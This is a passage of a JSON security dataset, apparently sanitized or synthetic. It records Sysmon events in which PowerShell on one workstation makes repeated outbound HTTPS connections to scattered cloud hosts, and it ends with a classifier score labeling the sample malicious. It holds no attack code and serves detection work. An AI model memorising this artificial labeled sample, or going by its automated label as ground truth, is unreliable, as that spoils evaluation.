            "subtype": "start",
            "time": "2020-09-29T16:37:50.821Z",
            "timestamp": 1601397470821,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 7,
            "dest_fqdn": "vm-198-51-100-9.cn-northwest-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-9",
            "dest_ip": "198.51.100.9",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "e63f0139b4ed1b439b89a3fc6755809c8ccfcd134de012263ccab61526b992b7",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:45:27.891Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "e63f0139b4ed1b439b89a3fc6755809c8ccfcd134de012263ccab61526b992b7",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4180017",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55683,
            "subtype": "start",
            "time": "2020-09-29T16:45:13.566Z",
            "timestamp": 1601397913566,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 1,
            "dest_fqdn": "vm-198-51-100-10.ap-southeast-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-10",
            "dest_ip": "198.51.100.10",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "3cbf5d4a21ff08d08e6eadcff07b4d3c459d5465dc449c15b8584f53d473f433",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:46:54.903Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "3cbf5d4a21ff08d08e6eadcff07b4d3c459d5465dc449c15b8584f53d473f433",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4180063",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55734,
            "subtype": "start",
            "time": "2020-09-29T16:46:40.492Z",
            "timestamp": 1601398000492,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "vm-198-51-100-11.af-south-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-11",
            "dest_ip": "198.51.100.11",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "d1b5cefeeea63132ebb9bd3a41561dbb8aa42194e2c4d9e459ecb560f9fe41d5",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:50:37.216Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "d1b5cefeeea63132ebb9bd3a41561dbb8aa42194e2c4d9e459ecb560f9fe41d5",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4180201",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 55860,
            "subtype": "start",
            "time": "2020-09-29T16:50:22.997Z",
            "timestamp": 1601398222997,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "vm-198-51-100-12.eu-west-2.compute.example.com",
            "dest_hostname": "vm-198-51-100-12",
            "dest_ip": "198.51.100.12",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "90d3db2ffbb5b63272902b00d1b0e8035fd582aa8ddc748d27b6f8a1d1459020",
            "event_type": "flow",
            "event_utc": "2020-09-29T16:55:36.635Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "90d3db2ffbb5b63272902b00d1b0e8035fd582aa8ddc748d27b6f8a1d1459020",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4180346",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 56022,
            "subtype": "start",
            "time": "2020-09-29T16:55:22.398Z",
            "timestamp": 1601398522398,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "049aa2bd9c21fa06e55467e562d2589a04a405f4b192788e89d20f51b741677f",
            "event_type": "file",
            "event_utc": "2020-09-29T16:59:02.073Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "049aa2bd9c21fa06e55467e562d2589a04a405f4b192788e89d20f51b741677f",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4180456",
            "subtype": "create",
            "time": "2020-09-29T16:59:02.076Z",
            "timestamp": 1601398742076,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 1,
            "dest_fqdn": "vm-198-51-100-13.ap-northeast-3.compute.example.com",
            "dest_hostname": "vm-198-51-100-13",
            "dest_ip": "198.51.100.13",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "466d74482d1feaa5b7e79cedc49b4b5cae8dff4e0115593ee37764b55e874056",
            "event_type": "flow",
            "event_utc": "2020-09-29T17:00:06.235Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "466d74482d1feaa5b7e79cedc49b4b5cae8dff4e0115593ee37764b55e874056",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 10944,
            "process_guid": "{DD483508-579A-5F73-0000-0010C692AC0C}",
            "record_number": "4180504",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.0",
            "src_ipv6": "false",
            "src_port": 56182,
            "subtype": "start",
            "time": "2020-09-29T16:59:51.919Z",
            "timestamp": 1601398791919,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-579A-5F73-0000-0010C692AC0C}"
        }
    ],
    "score": {
        "description": "malicious - technique_count > 2.5",
        "scored_by": "bbate_smart_classifier_v1.1",
        "value": 1
    }
}